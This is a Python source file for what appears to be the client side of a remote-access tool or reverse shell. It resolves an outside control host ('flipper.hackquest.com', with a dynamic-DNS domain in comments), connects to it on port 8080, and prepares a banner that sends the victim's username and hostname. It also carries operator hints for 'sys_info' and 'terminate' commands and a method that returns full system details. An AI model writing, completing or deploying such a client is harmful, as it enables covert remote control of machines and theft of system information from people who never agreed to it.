#!/usr/bin/env python3
import os
import socket
import getpass


class ClientConfig:

    SIG = "ACTIVE"
    ACK_SIG = "0x06"
    FLAG = False
    BUFFER = 1024
    SHORT_INTERVAL = 0.1
    MID_INTERVAL = 0.8
    S_INTERVAL = 3
    LONG_INTERVAL = 10

    def __init__(self):
        self._sock = None
        self._port = None
        self._loop = None
        self._info = None

    # initializer
    def init(self):
        # set new socket
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # set loopback address
        # self._loop = "127.0.0.1" #socket.gethostbyname("localhost")
        # domain.ddns.chickenkiller.com
        # flipper.hackquest.com
        # self._loop = 'flipper.hackquest.com'
        self._loop = socket.gethostbyname('flipper.hackquest.com')
        # set new port
        # cls._port = 4434
        self._port = 8080
        self._info = self.build_info()

    # get fisrt time interaction info
    @staticmethod
    def build_info():
        str1 = "\n[+] USER: "
        str2 = "\n[+] HOSTNAME: "
        com1 = "\n\n<!> get more info using 'sys_info' command"
        com2 = "\n<!> terminate the remote host connection using 'terminate' command"
        com3 = "\n<!> press Enter and then Ctrl+C :: remote host connection will keep alive\n\n"
        return "{0}{1}{2}{3}{4}{5}{6}".format(str1, getpass.getuser(), str2, os.uname()[1], com1, com2, com3)

    # get system info
    @staticmethod
    def drill_down():
        return "\n" + str(os.uname()) + "\n"